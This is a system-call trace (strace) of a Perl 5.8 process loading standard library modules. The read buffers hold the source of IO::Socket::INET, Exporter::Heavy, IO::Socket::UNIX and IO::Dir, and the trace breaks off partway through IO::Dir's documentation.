19001 12:57:07.418337 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.418352 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.418367 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.418379 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.418393 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.418405 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.418418 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.418432 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
19001 12:57:07.418454 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 7
19001 12:57:07.418468 ioctl(7, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e3b58) = -1 ENOTTY (Inappropriate ioctl for device)
19001 12:57:07.418480 _llseek(7, 0, [0], SEEK_CUR) = 0
19001 12:57:07.418497 read(7, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
19001 12:57:07.418861 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.418878 stat64("/etc/perl/Exporter/Heavy.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.418894 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.418908 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.418921 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.418934 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.418948 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.418960 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.418974 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.418986 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.418999 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.419012 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.419026 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.419039 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
19001 12:57:07.419061 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 9
19001 12:57:07.419075 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e36a8) = -1 ENOTTY (Inappropriate ioctl for device)
19001 12:57:07.419086 _llseek(9, 0, [0], SEEK_CUR) = 0
19001 12:57:07.419103 read(9, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
19001 12:57:07.419950 read(9, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
19001 12:57:07.420179 brk(0x829c000)    = 0x829c000
19001 12:57:07.420529 read(9, "", 4096) = 0
19001 12:57:07.420545 close(9)          = 0
19001 12:57:07.422078 read(7, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
19001 12:57:07.422536 _llseek(7, 6496, [6496], SEEK_SET) = 0
19001 12:57:07.422552 _llseek(7, 0, [6496], SEEK_CUR) = 0
19001 12:57:07.422563 close(7)          = 0
19001 12:57:07.422626 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.422643 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.422657 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.422671 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.422685 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.422698 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.422763 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.422778 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.422808 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.422834 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.422848 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.422862 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
19001 12:57:07.422884 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 7
19001 12:57:07.422899 ioctl(7, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e3b58) = -1 ENOTTY (Inappropriate ioctl for device)
19001 12:57:07.422910 _llseek(7, 0, [0], SEEK_CUR) = 0
19001 12:57:07.422926 brk(0x82bd000)    = 0x82bd000
19001 12:57:07.422943 read(7, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
19001 12:57:07.423785 _llseek(7, 1386, [1386], SEEK_SET) = 0
19001 12:57:07.423818 _llseek(7, 0, [1386], SEEK_CUR) = 0
19001 12:57:07.423829 close(7)          = 0
19001 12:57:07.423885 stat64("/etc/perl/IO/Dir.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.423901 stat64("/etc/perl/IO/Dir.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.423914 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.423926 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.423940 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.423952 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.423966 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.423977 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.423990 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.424002 stat64("/usr/share/perl5/IO/Dir.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.424015 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.424028 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
19001 12:57:07.424052 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 7
19001 12:57:07.424067 ioctl(7, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e3b58) = -1 ENOTTY (Inappropriate ioctl for device)
19001 12:57:07.424078 _llseek(7, 0, [0], SEEK_CUR) = 0
19001 12:57:07.424145 read(7, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    